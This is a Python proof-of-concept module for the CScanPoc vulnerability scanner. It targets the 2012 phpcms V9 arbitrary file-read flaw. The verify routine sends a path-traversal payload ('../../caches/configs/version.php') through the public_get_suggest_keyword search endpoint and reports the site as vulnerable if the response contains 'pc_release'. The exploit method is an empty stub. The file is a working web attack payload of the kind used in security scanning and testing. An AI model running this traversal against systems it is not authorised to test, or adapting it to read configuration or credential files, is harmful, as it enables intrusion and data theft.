# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0019' # 平台漏洞编号，留空
    name = 'phpcms V9最新任意读文件漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-07-23'  # 漏洞公布时间
    desc = '''
        phpcms V9最新任意读文件漏洞
    ''' # 漏洞描述
    ref = 'https://www.2cto.com/article/201207/142839.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'phpcms'  # 漏洞应用名称
    product_version = 'V9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4d5064ff-f71f-46d4-a1f9-d06bc01e1beb'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/version.php" 
            url = arg + payload
            code, head,res, errcode, _ = hh.http(url)

            m = re.search('pc_release',res)           
            if m:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()